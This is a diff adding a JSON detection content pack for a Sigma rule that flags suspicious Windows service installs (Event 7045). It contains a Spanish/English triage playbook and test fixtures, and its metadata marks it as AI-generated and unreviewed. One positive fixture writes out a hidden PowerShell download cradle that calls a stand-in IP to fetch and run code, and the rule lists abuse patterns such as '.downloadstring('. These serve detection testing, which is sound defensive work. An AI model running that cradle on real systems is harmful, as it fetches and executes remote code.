@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "1d61f71d-59d2-479e-9562-4ff5f4ead16b",
+    "title": "Suspicious Service Installation",
+    "level": "high",
+    "status": "test",
+    "author": "pH-T (Nextron Systems), Florian Roth (Nextron Systems)",
+    "path": "windows/builtin/system/service_control_manager/win_system_service_install_susp.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/builtin/system/service_control_manager/win_system_service_install_susp.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1543.003"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se instaló un servicio de Windows (Event ID 7045) cuyo ImagePath contiene patrones típicos de abuso: flags ocultos de PowerShell, descargas, rutas Temp, ADMIN$, Perflogs o comandos encadenados con '&&'.",
+      "what_it_detects": "Eventos 7045 del proveedor 'Service Control Manager' en el log System donde ImagePath incluye ' -nop ', ' -sta ', ' -w hidden ', ':\\Temp\\', '.downloadfile(', '.downloadstring(', '\\ADMIN$\\', '\\Perflogs\\' o '&&'.",
+      "why_it_matters": "Crear o modificar servicios de Windows (T1543.003) da persistencia y ejecución como SYSTEM. Herramientas de ejecución remota y frameworks ofensivos instalan servicios temporales desde ADMIN$ o con comandos PowerShell ocultos.",
+      "triage_steps": [
+        "Lee el ImagePath completo y anota ServiceName, StartType y AccountName. Fíjate en nombres aleatorios, binarios en ADMIN$ o Temp y PowerShell codificado u oculto.",
+        "Si hay URLs o IPs en ImagePath, revisa su reputación y busca conexiones salientes hacia ellas desde el host en un rango de +/- 15 minutos.",
+        "Busca un logon de red (4624 tipo 3) y el acceso al recurso ADMIN$ (5140/5145) justo antes del evento para identificar el usuario y la IP de origen.",
+        "Pivota a la IP de origen y busca otras instalaciones de servicios en más hosts (movimiento lateral).",
+        "Revisa la telemetría de procesos del host: hijos de services.exe, cmd.exe o powershell.exe y archivos creados por el servicio.",
+        "Si el binario sigue en disco, calcula su hash y verifica la firma. Consulta si hubo alertas anteriores para el mismo host o usuario.",
+        "Confirma con el equipo de TI si existe un despliegue o mantenimiento autorizado que coincida con la hora y la cuenta."
+      ],
+      "false_positives": [
+        "Herramientas de administración remota o despliegue de software que copian binarios temporales a ADMIN$ o Temp.",
+        "Instaladores o scripts de TI que registran servicios con comandos encadenados con '&&' o con PowerShell no interactivo.",
+        "Herramientas de pentesting o red team autorizadas durante un ejercicio planificado."
+      ],
+      "response_steps": [
+        "Verifica la legitimidad con el dueño del sistema antes de actuar; conserva el evento, el binario y su hash como evidencia.",
+        "Si es malicioso, aísla el endpoint y deshabilita o restablece la cuenta usada para instalar el servicio.",
+        "Detén y elimina el servicio, borra los binarios asociados y bloquea las URLs, IPs y hashes identificados.",
+        "Busca el mismo ServiceName, ImagePath o hash en toda la flota y revisa los hosts accedidos desde la misma IP de origen.",
+        "Restaura el host desde una imagen confiable si hay indicios de compromiso más profundo, y rota las credenciales expuestas."
+      ],
+      "severity_rationale": "Nivel alto: estos patrones casi nunca aparecen en servicios legítimos y suelen indicar ejecución remota como SYSTEM o persistencia."
+    },
+    "en": {
+      "summary": "A Windows service was installed (Event ID 7045) whose ImagePath contains common abuse patterns: hidden PowerShell flags, download calls, Temp, ADMIN$ or Perflogs paths, or '&&' command chaining.",
+      "what_it_detects": "System log 7045 events from 'Service Control Manager' where ImagePath contains ' -nop ', ' -sta ', ' -w hidden ', ':\\Temp\\', '.downloadfile(', '.downloadstring(', '\\ADMIN$\\', '\\Perflogs\\' or '&&'.",
+      "why_it_matters": "Creating or modifying Windows services (T1543.003) gives persistence and SYSTEM-level execution. Remote execution tools and offensive frameworks install temporary services from ADMIN$ or with hidden PowerShell commands.",
+      "triage_steps": [
+        "Read the full ImagePath and note ServiceName, StartType and AccountName. Look for random names, binaries in ADMIN$ or Temp, and hidden or encoded PowerShell.",
+        "If ImagePath contains URLs or IPs, check their reputation and look for outbound connections to them from the host within +/- 15 minutes.",
+        "Look for a network logon (4624 type 3) and ADMIN$ share access (5140/5145) just before the event to find the source user and IP.",
+        "Pivot on the source IP and look for service installs on other hosts, which would suggest lateral movement.",
+        "Review process telemetry on the host: children of services.exe, cmd.exe or powershell.exe, and files the service created.",
+        "If the binary is still on disk, hash it and check its signature. Check for earlier alerts on the same host or user.",
+        "Ask IT whether an authorized deployment or maintenance task matches the time and account."
+      ],
+      "false_positives": [
+        "Remote administration or software deployment tools that copy temporary binaries to ADMIN$ or Temp.",
+        "IT installers or scripts that register services using '&&' chains or non-interactive PowerShell.",
+        "Authorized pentest or red team tooling during a planned exercise."
+      ],
+      "response_steps": [
+        "Check legitimacy with the system owner before acting. Keep the event, the binary and its hash as evidence.",
+        "If malicious, isolate the endpoint and disable or reset the account that installed the service.",
+        "Stop and delete the service, remove its binaries, and block the identified URLs, IPs and hashes.",
+        "Hunt for the same ServiceName, ImagePath or hash across the fleet, and review hosts accessed from the same source IP.",
+        "Reimage the host from a trusted image if there are signs of deeper compromise, and rotate exposed credentials."
+      ],
+      "severity_rationale": "High fits because legitimate services rarely use these patterns, and they usually mean remote SYSTEM execution or persistence."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Service launching hidden PowerShell with a download cradle (matches ' -nop ', ' -w hidden ' and '.downloadstring(')",
+        "event": {
+          "Provider_Name": "Service Control Manager",
+          "EventID": 7045,
+          "Computer": "WS-0142.andes.example.com",
+          "ServiceName": "WinUpdSvc",
+          "ImagePath": "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"IEX (New-Object Net.WebClient).downloadstring('http://198.51.100.23/a')\"",
+          "ServiceType": "user mode service",
+          "StartType": "demand start",
+          "AccountName": "LocalSystem"
+        }
+      },
+      {
+        "description": "Randomly named service binary run from the ADMIN$ share, typical of remote execution tools",
+        "event": {
+          "Provider_Name": "Service Control Manager",
+          "EventID": 7045,
+          "Computer": "SRV-FS01.andes.example.com",
+          "ServiceName": "kXqTzPwa",
+          "ImagePath": "\\\\SRV-FS01\\ADMIN$\\a8f3c1d.exe",
+          "ServiceType": "user mode service",
+          "StartType": "demand start",
+          "AccountName": "LocalSystem"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate vendor agent installed under Program Files",
+        "event": {
+          "Provider_Name": "Service Control Manager",
+          "EventID": 7045,
+          "Computer": "WS-0142.andes.example.com",
+          "ServiceName": "ExampleCorpAgent",
+          "ImagePath": "\"C:\\Program Files\\ExampleCorp\\Agent\\agentsvc.exe\" -service",
+          "ServiceType": "user mode service",
+          "StartType": "auto start",
+          "AccountName": "LocalSystem"
+        }
+      },
+      {
+        "description": "Near-miss: PowerShell service using the full -NoProfile flag (not ' -nop ') and a script under C:\\Scripts",
+        "event": {
+          "Provider_Name": "Service Control Manager",
+          "EventID": 7045,
+          "Computer": "SRV-APP02.andes.example.com",
+          "ServiceName": "InventoryCollector",
+          "ImagePath": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\inventory.ps1",
+          "ServiceType": "user mode service",
+          "StartType": "auto start",
+          "AccountName": "ANDES\\svc_inventory"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
